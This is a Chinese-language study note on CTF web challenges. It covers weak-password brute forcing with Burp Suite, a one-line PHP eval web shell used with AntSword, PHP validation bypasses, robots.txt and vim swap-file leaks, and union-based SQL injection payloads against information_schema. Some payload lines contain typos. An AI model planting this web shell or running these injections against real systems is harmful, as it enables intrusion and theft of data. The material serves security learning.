web学习笔记

记录一下学习过程中遇见的常见ctf中web赛道的题目、题型。
多是利用Hackbar、Burpsuite、蚁剑等工具。

一、简单类型

1.常规弱口令密码登录

利用Burpsuite抓包，将所得数据包发送到Intruder进行爆破，导入弱口令字典，将登录请求的包中的用户名和密码替换成常规弱口令。

2.一句话木马

<?php @eval($_POsT['a']); ?>

  • 先尝试一句话木马代码放入网页中，当访问该网页时，浏览器会自动执行该代码。
  • 用蚁剑输入攻击目标网页的URL，先右键点击空白处，选择添加数据，再输入URL，链接密码则选择post传递过去的a，即可getshell，查看网页后端的文件夹。

3.后端代码多重验证与绕过

如果能直接观察到后端代码，先观察验证条件，尝试全部满足，无法全部满足则尝试逐一绕过。
并且观察是Get传参还是Post传参，利用Hackbar进行数据上传。
get直接在URL后面加参数，post则在body中上传参数。

  • 看见replace函数可以尝试双写绕过；
  • 看见flie_get_contents函数(可以上传数据流)可以尝试上传文件,上传数据流或将数据流编码之后绕过。
  • strpos函数查找目标字符在另一字符串中的位置并返回。

4.robots协议

robots协议是一种网络爬虫协议，用于告诉搜索引擎哪些页面可以抓取。

  • 若网页有提示为robots协议或有robots文件夹，则可以进入robots.txt文件，查看是否有禁止爬虫的文档，尝试访问寻找flag。

5.vim隐藏flag

vim是linux中的文件编辑器，其打开后会创建.swp的临时文件，隐藏flag一般在临时文件中。

  • 一般先尝试访问index.php,不行则去尝试访问.index.php.swp,若能成功获取文件，则flag可能就在里面。

6.弱类型问题

  • 如php语言中的弱比较“==”，将不同类型值转化成相同类型来比较。
  • 规则是：当一个字符串被当作一个数值来取值，其结果和类型如下：如果该字符串没有包含‘.’，‘e’，‘E’并且其数值值在整形的范围之内，则该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。
  • 0e形式的字符串会被识别为科学计数法，将被转化为数字做比较。

二、SQL注入类型

1.SQL注入的一般步骤

判断注入点 —— 第一步

  • 找页面与数据库产生交互的地方。

如有一串URL，http://injectx1.lab.aqlab.cn:81/Pass-01/index.php?id=1。

这一长串url中 ’ ? ’ 后跟的就是参数id=1，’ ? ’ 表示传参。一般来讲 ’ ? ‘的内容都是用户可控的。若不存在能够与数据库产生交互的地方，那么sql注入也就自然无处下手了。

传入SQL语句可控参数分为两类：

  • 数字类型，参数不用被引号引用 ?id=1

  • 其他类型，参数需要被引号引用 ?name="phone"

界面报错

mysql中的information_schema说明
information_schema : mysql数据库5.0以上版本，自带数据库，记录了mysql下所有的库名，表名，列名等信息。
主要用到以下几个：

  • schemata表 (mysql服务器中所有数据库信息的表)
  • tables表 (mysql服务器中所有表信息的表)
  • columns表（mysql服务器所有列信息的表）
  • table_schema 数据库名
  • table_name 表名
  • column_name 列名

SQL手注四部曲：

  • 判断注入点

id=1 and 1=2

  • 判断字段数

    id=1 order by 1

    id=1 order by 2

    id=1 order by 3

    ……

  • 判断回显点

    id=1 and 1=2 union select 1,2,3

    id=1 and 1=2 union select 123,222,333

  • 查询相关内容

    id=1 and 1=2 union select 1,database(),3

    id=1 and 1=2 union select 1,table_name,3 from information_schema.tables where table_schema=’error’

    union select 1,column_name,3 from information_schema.columns where table_schema=’error’ and table_name=’error_flag’ limit 1,1

    id=1 ans 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=‘error’ and table_name=’error_flag’
